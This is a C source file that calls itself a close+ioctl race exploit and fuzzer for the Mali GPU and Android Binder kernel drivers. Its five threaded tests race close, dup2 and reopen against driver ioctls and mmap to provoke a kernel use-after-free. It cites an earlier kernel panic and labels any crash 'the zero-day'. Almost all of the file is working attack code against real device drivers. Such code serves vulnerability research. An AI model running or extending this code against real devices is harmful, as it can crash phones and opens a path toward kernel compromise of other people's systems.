/*
 * mali_close_race.c — Close+ioctl race exploit for Mali vendor dispatch
 *
 * THEORY:
 * When close(mali_fd) races with ioctl(mali_fd, vendor_import), the ioctl
 * may execute with a partially destroyed kbase_context. The vendor dispatch
 * reads function pointers from the context structure. If the context is
 * freed mid-ioctl, those pointers become dangling → wild pointer deref.
 *
 * The original kernel panic from deep_race_fuzz had:
 *   PC at _raw_spin_lock_irqsave+0x30/0x6c
 *   LR at down+0x18/0x54
 * This matches a semaphore/mutex on freed memory — classic close+ioctl race.
 *
 * STRATEGY:
 * T1: close(mali_fd) + vendor_import on SAME fd (race on context teardown)
 * T2: close(mali_fd) + standard import on SAME fd
 * T3: dup2(devnull, mali_fd) + vendor_import (fd replacement race)
 * T4: close+reopen rapid cycle + ioctl (fd number reuse race)
 * T5: Multi-thread: 4 threads doing vendor ioctls + 1 thread closing
 *
 * Safety: all tests in forked children with alarm timeouts.
 * Each iteration opens a FRESH mali context to avoid stale state.
 *
 * Build: .\qemu\build-arm.bat src\mali_close_race.c mali_close_race
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <time.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

/* Open and initialize Mali context — returns fd or -1 */
static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0;
    hb[8] = 10; /* major version */
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530; /* context init */
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

/* Allocate ION dma_buf fd */
static int ion_alloc_dmabuf(void) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc_s) < 0) { close(ion_fd); return -1; }
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share_s) < 0) { close(ion_fd); return -1; }
    close(ion_fd);
    return share_s.fd;
}

/* Build a vendor import ioctl buffer */
static void build_import_buf(uint8_t *buf, int *fd_ptr) {
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513; /* MEM_IMPORT */
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)fd_ptr; /* phandle = &fd */
    *(uint32_t*)(buf + 16) = 2; /* type = UMM */
    *(uint64_t*)(buf + 24) = 0xF; /* flags */
}

static volatile int go = 0, stop_flag = 0;
static volatile int shared_mali_fd = -1;
static volatile int crash_count = 0;

/* ========== T1: close(mali) + vendor_import race ========== */

static void *t1_closer(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd >= 0) {
            close(fd);
            shared_mali_fd = -1;
        }
        ops++;
        /* Reopen for next iteration */
        int nfd = mali_open_ctx();
        shared_mali_fd = nfd;
    }
    return (void*)(long)ops;
}

static void *t1_importer(void *arg) {
    while (!go) sched_yield();
    int ops = 0, errs = 0;
    int dma_fd = ion_alloc_dmabuf();
    if (dma_fd < 0) return NULL;

    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd < 0) { sched_yield(); continue; }

        uint8_t ibuf[48];
        build_import_buf(ibuf, &dma_fd);
        int r = ioctl(fd, make_cmd_vendor(48), ibuf);
        if (r < 0 && errno == EBADF) errs++;
        ops++;
    }
    close(dma_fd);
    return (void*)(long)ops;
}

static void test1_close_import_race(int iters) {
    printf("\n=== T1: close(mali) + vendor_import race (%d sec) ===\n", iters);
    fflush(stdout);

    shared_mali_fd = mali_open_ctx();
    if (shared_mali_fd < 0) { printf("  SKIP: can't open mali\n"); return; }

    go = 0; stop_flag = 0;
    pthread_t tc, ti;
    pthread_create(&tc, NULL, t1_closer, NULL);
    pthread_create(&ti, NULL, t1_importer, NULL);

    go = 1;
    sleep(iters);
    stop_flag = 1;

    void *rc, *ri;
    pthread_join(tc, &rc);
    pthread_join(ti, &ri);
    printf("  closer: %ld ops, importer: %ld ops\n", (long)rc, (long)ri);

    int fd = shared_mali_fd;
    if (fd >= 0) close(fd);
    shared_mali_fd = -1;
}

/* ========== T2: dup2(devnull) + vendor_import race ========== */

static void *t2_duper(void *arg) {
    while (!go) sched_yield();
    int devnull = open("/dev/null", O_RDWR);
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd >= 0) {
            dup2(devnull, fd);
            /* Immediately reopen mali on same fd number */
            int nfd = mali_open_ctx();
            if (nfd >= 0 && nfd != fd) {
                dup2(nfd, fd);
                close(nfd);
            }
        }
        ops++;
    }
    close(devnull);
    return (void*)(long)ops;
}

static void test2_dup2_import_race(int iters) {
    printf("\n=== T2: dup2(devnull, mali) + vendor_import race (%d sec) ===\n", iters);
    fflush(stdout);

    shared_mali_fd = mali_open_ctx();
    if (shared_mali_fd < 0) { printf("  SKIP: can't open mali\n"); return; }

    go = 0; stop_flag = 0;
    pthread_t td, ti;
    pthread_create(&td, NULL, t2_duper, NULL);
    pthread_create(&ti, NULL, t1_importer, NULL); /* reuse importer */

    go = 1;
    sleep(iters);
    stop_flag = 1;

    void *rd, *ri;
    pthread_join(td, &rd);
    pthread_join(ti, &ri);
    printf("  duper: %ld ops, importer: %ld ops\n", (long)rd, (long)ri);

    int fd = shared_mali_fd;
    if (fd >= 0) close(fd);
    shared_mali_fd = -1;
}

/* ========== T3: Multi-function race (import + free + map) ========== */

static void *t3_freer(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd < 0) { sched_yield(); continue; }

        /* Send MEM_FREE (func 514) — free a GPU VA that might not exist */
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 514; /* MEM_FREE */
        *(uint64_t*)(buf + 8) = 0x102000000ULL; /* gpu_va from typical import */
        ioctl(fd, make_cmd_vendor(48), buf);
        ops++;
    }
    return (void*)(long)ops;
}

static void *t3_mapper(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd < 0) { sched_yield(); continue; }

        /* Send MEM_FLAGS_CHANGE (func 516) */
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 516;
        *(uint64_t*)(buf + 8) = 0x102000000ULL;
        *(uint64_t*)(buf + 16) = 0xF;
        ioctl(fd, make_cmd_vendor(48), buf);
        ops++;
    }
    return (void*)(long)ops;
}

static void test3_multi_race(int iters) {
    printf("\n=== T3: close + import + free + flags_change race (%d sec) ===\n", iters);
    fflush(stdout);

    shared_mali_fd = mali_open_ctx();
    if (shared_mali_fd < 0) { printf("  SKIP: can't open mali\n"); return; }

    go = 0; stop_flag = 0;
    pthread_t tc, ti, tf, tm;
    pthread_create(&tc, NULL, t1_closer, NULL);
    pthread_create(&ti, NULL, t1_importer, NULL);
    pthread_create(&tf, NULL, t3_freer, NULL);
    pthread_create(&tm, NULL, t3_mapper, NULL);

    go = 1;
    sleep(iters);
    stop_flag = 1;

    void *rc, *ri, *rf, *rm;
    pthread_join(tc, &rc);
    pthread_join(ti, &ri);
    pthread_join(tf, &rf);
    pthread_join(tm, &rm);
    printf("  closer:%ld import:%ld free:%ld flags:%ld\n",
           (long)rc, (long)ri, (long)rf, (long)rm);

    int fd = shared_mali_fd;
    if (fd >= 0) close(fd);
    shared_mali_fd = -1;
}

/* ========== T4: Binder close+ioctl race ========== */

static volatile int shared_binder_fd = -1;

#define BINDER_VERSION _IOWR('b', 9, int)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BC_ENTER_LOOPER 0x630c
#define BC_EXIT_LOOPER 0x630d

static void *t4_binder_closer(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_binder_fd;
        if (fd >= 0) {
            close(fd);
            shared_binder_fd = -1;
        }
        /* Reopen binder */
        int nfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (nfd >= 0) {
            uint32_t max = 0;
            ioctl(nfd, BINDER_SET_MAX_THREADS, &max);
        }
        shared_binder_fd = nfd;
        ops++;
    }
    return (void*)(long)ops;
}

static void *t4_binder_writer(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_binder_fd;
        if (fd < 0) { sched_yield(); continue; }

        /* Send ENTER_LOOPER then EXIT_LOOPER (creates/destroys binder_thread) */
        uint32_t cmds[2] = { BC_ENTER_LOOPER, BC_EXIT_LOOPER };
        struct {
            signed long write_size, write_consumed;
            unsigned long write_buffer;
            signed long read_size, read_consumed;
            unsigned long read_buffer;
        } bwr;
        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(cmds);
        bwr.write_buffer = (unsigned long)cmds;

        ioctl(fd, _IOWR('b', 1, typeof(bwr)), &bwr);
        ops++;
    }
    return (void*)(long)ops;
}

static void test4_binder_close_race(int iters) {
    printf("\n=== T4: Binder close + write_read race (%d sec) ===\n", iters);
    fflush(stdout);

    shared_binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (shared_binder_fd < 0) { printf("  SKIP: can't open binder\n"); return; }

    go = 0; stop_flag = 0;
    pthread_t tc, tw;
    pthread_create(&tc, NULL, t4_binder_closer, NULL);
    pthread_create(&tw, NULL, t4_binder_writer, NULL);

    go = 1;
    sleep(iters);
    stop_flag = 1;

    void *rc, *rw;
    pthread_join(tc, &rc);
    pthread_join(tw, &rw);
    printf("  closer: %ld ops, writer: %ld ops\n", (long)rc, (long)rw);

    int fd = shared_binder_fd;
    if (fd >= 0) close(fd);
    shared_binder_fd = -1;
}

/* ========== T5: Mali mmap + close race ========== */

static void *t5_mmapper(void *arg) {
    while (!go) sched_yield();
    int ops = 0;
    while (!stop_flag) {
        int fd = shared_mali_fd;
        if (fd < 0) { sched_yield(); continue; }

        /* Try to mmap the mali fd — even if it fails, the kernel processes it */
        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED, fd, 0);
        if (p != MAP_FAILED) {
            /* Touch the mapping briefly */
            volatile char *v = (volatile char *)p;
            *v;
            munmap(p, 4096);
        }
        ops++;
    }
    return (void*)(long)ops;
}

static void test5_mali_mmap_close_race(int iters) {
    printf("\n=== T5: Mali mmap + close race (%d sec) ===\n", iters);
    fflush(stdout);

    shared_mali_fd = mali_open_ctx();
    if (shared_mali_fd < 0) { printf("  SKIP: can't open mali\n"); return; }

    go = 0; stop_flag = 0;
    pthread_t tc, tm;
    pthread_create(&tc, NULL, t1_closer, NULL);
    pthread_create(&tm, NULL, t5_mmapper, NULL);

    go = 1;
    sleep(iters);
    stop_flag = 1;

    void *rc, *rm;
    pthread_join(tc, &rc);
    pthread_join(tm, &rm);
    printf("  closer: %ld ops, mmapper: %ld ops\n", (long)rc, (long)rm);

    int fd = shared_mali_fd;
    if (fd >= 0) close(fd);
    shared_mali_fd = -1;
}

/* ========== MAIN ========== */

static void sighandler(int sig) {
    printf("  *** SIGNAL %d in child ***\n", sig);
    fflush(stdout);
    _exit(128 + sig);
}

int main(int argc, char **argv) {
    int duration = 5; /* seconds per test */
    if (argc > 1) duration = atoi(argv[1]);
    if (duration < 1) duration = 1;
    if (duration > 30) duration = 30;

    printf("=== Mali/Binder Close+Ioctl Race Fuzzer ===\n");
    printf("Duration: %d sec/test, PID=%d UID=%d\n", duration, getpid(), getuid());
    fflush(stdout);

    struct {
        const char *name;
        void (*func)(int);
    } tests[] = {
        { "close + vendor_import",       test1_close_import_race },
        { "dup2 + vendor_import",        test2_dup2_import_race },
        { "close + multi-func race",     test3_multi_race },
        { "binder close + write_read",   test4_binder_close_race },
        { "mali mmap + close",           test5_mali_mmap_close_race },
        { NULL, NULL }
    };

    for (int i = 0; tests[i].name; i++) {
        printf("\n--- %s ---\n", tests[i].name);
        fflush(stdout);

        pid_t pid = fork();
        if (pid == 0) {
            signal(SIGSEGV, sighandler);
            signal(SIGBUS, sighandler);
            alarm(duration + 10); /* hard timeout */
            tests[i].func(duration);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            if (sig == 14) printf("*** %s: HUNG (SIGALRM) ***\n", tests[i].name);
            else printf("*** %s: CRASHED sig=%d ***\n", tests[i].name, sig);
        } else if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            if (code != 0)
                printf("*** %s: exit=%d ***\n", tests[i].name, code);
            else
                printf("  %s: OK\n", tests[i].name);
        }

        /* Brief pause between tests for device stability */
        usleep(500000);
    }

    printf("\n=== All close+ioctl race tests complete ===\n");
    printf("If device survived, no close+ioctl UAF found.\n");
    printf("If kernel panicked, the crashing test is the zero-day!\n");
    return 0;
}
